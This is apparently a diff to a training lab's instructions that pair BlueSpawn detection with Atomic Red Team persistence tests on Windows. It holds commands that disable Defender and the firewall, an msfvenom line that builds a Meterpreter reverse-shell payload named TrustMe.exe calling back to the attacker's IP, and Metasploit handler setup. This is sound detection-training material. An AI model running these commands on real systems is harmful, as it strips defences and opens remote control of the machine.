@@ -19,10 +19,9 @@ In this lab, we will be starting BlueSpawn and then running Atomic Red Team to t
 First, we need to disable Defender. 
 Start by opening up <b>Windows Powershell</b>.
 
-<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />
+<img width="365" height="195" alt="image" src="https://github.com/user-attachments/assets/ed27c1ce-6e3d-4436-8567-494b4da79d49" />
 
-
-Next, run the following command:
+Next, run the following commands:
 
 ```ps
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -44,8 +43,7 @@ This will disable Defender for this session.
 
 Now, let's open a **command prompt**:
 
-<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/f62f8205-8828-4a2b-97f0-e7137ec466e5" />
-
+<img width="370" height="195" alt="image" src="https://github.com/user-attachments/assets/f8875993-3492-4208-9fd6-617283ea298f" />
  
 Next, let’s change directories to tools and start Bluespawn:
 
@@ -70,7 +68,7 @@ First, we need to open a PowerShell terminal.
 
 You can do this by selecting the icon in the taskbar/desktop:
 
-<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />
+<img width="365" height="195" alt="image" src="https://github.com/user-attachments/assets/ed27c1ce-6e3d-4436-8567-494b4da79d49" />
 
 Now we need to install and update Atomic Red Team. Run the following:
 
@@ -123,7 +121,8 @@ Once we do this, we need to invoke all the Atomic Tests.
 >
 >We recommend that you run in on a system with your EDR/Endpoint protection in non-blocking/alerting mode. This is so you can see what the protection would have done, but it will allow the tests to finish so we are just going to run individual tests for now.
 
-Run the following individually:
+Run the following individually. The test selections below were chosen to demonstrate several persistence
+techniques while avoiding Atomic tests that are unstable with BLUESPAWN monitor mode in this lab environment:
 
 ```ps
 Invoke-AtomicTest T1547.004
@@ -141,16 +140,26 @@ More information here:
 
 https://attack.mitre.org/techniques/T1543/003/
 
+You can also specify which tests you want to run:
+
 ```ps
-Invoke-AtomicTest T1547.001
+Invoke-AtomicTest T1547.001 -TestNumbers 1,9,11,12
 ```
+
+Each test uses a different mechanism : 
+
+- 1 - Registry Run key
+- 7 - Executable shortcut in the Startup folder
+- 9 - SystemBC through registry type Persistence
+- 11 - Using User Shell Folders to modify the Startup path
 
 More information here:
 
 https://attack.mitre.org/techniques/T1547/001/
 
+
 ```ps
-Invoke-AtomicTest T1546.008
+Invoke-AtomicTest T1546.008 -TestNumbers 1
 ```
 
 More information here:
@@ -164,23 +173,23 @@ https://attack.mitre.org/techniques/T1546/008/
 
 It should look like this:
 
-<img width="633" height="264" alt="2026-03-26_10-00" src="https://github.com/user-attachments/assets/3cc66d66-4156-45be-b149-e81145a1a920" />
-
+<img width="936" height="478" alt="image" src="https://github.com/user-attachments/assets/18ddba81-7d21-4875-9ccf-c447eb58d665" />
 
 >[!NOTE]
 >
->There might be some errors when this runs. This is 
-normal.
+>There might be some errors when this runs. This is normal.
 
->[!IMPORTANT]
+> [!IMPORTANT]
 >
->We had to cross reference the old numbering with the new.
+> The Atomic Red Team commands in this lab have already been updated to use
+> the current MITRE ATT&CK technique and sub-technique IDs.
 >
->You can find that mapping here:
+> The updated BLUESPAWN release also uses the current ATT&CK technique names.
 >
->https://attack.mitre.org/docs/subtechniques/subtechniques-crosswalk.json
+> The official MITRE ATT&CK sub-technique crosswalk is available here for
+> historical reference:
 >
->![](attachments/crossreference.png)
+> https://attack.mitre.org/docs/subtechniques/subtechniques-crosswalk.json
 
 
 You should be getting a lot of alerts with Bluespawn! Switch tabs in your Terminal to see them:
@@ -191,7 +200,10 @@ You should be getting a lot of alerts with Bluespawn! Switch tabs in your Termin
 Now, let’s go back to the PowerShell window and clean up:
 
 ```ps
-Invoke-AtomicTest All -Cleanup
+Invoke-AtomicTest T1547.004 -Cleanup
+Invoke-AtomicTest T1543.003 -Cleanup
+Invoke-AtomicTest T1547.001 -TestNumbers 1,9,11,12 -Cleanup
+Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup
 ```
 
 It should look like this:
@@ -228,7 +240,6 @@ Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 ```cmd
 netsh advfirewall set allprofiles state off
 ```
-
 
 Next, set a password for the Administrator account that you can remember
 
@@ -272,16 +283,10 @@ cd /tmp/
 Run the following commands to start a simple backdoor and backdoor listener: 
 
 ```bash
-
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
 
-
-
 <img width="1096" height="136" alt="2026-03-26_10-33" src="https://github.com/user-attachments/assets/cedde4be-e44e-4bab-87bb-5a683603e50f" />
-
-
-
 
 Now let's start the **Metasploit** Handler
 
@@ -312,9 +317,6 @@ exploit
 It should look like this:
 
 <img width="687" height="206" alt="2026-02-23_15-38" src="https://github.com/user-attachments/assets/71226123-2163-4237-8173-c7586de81ee7" />
-
-
-
 
 Open up a **Powershell** terminal, copy the file over from **Linux**
 
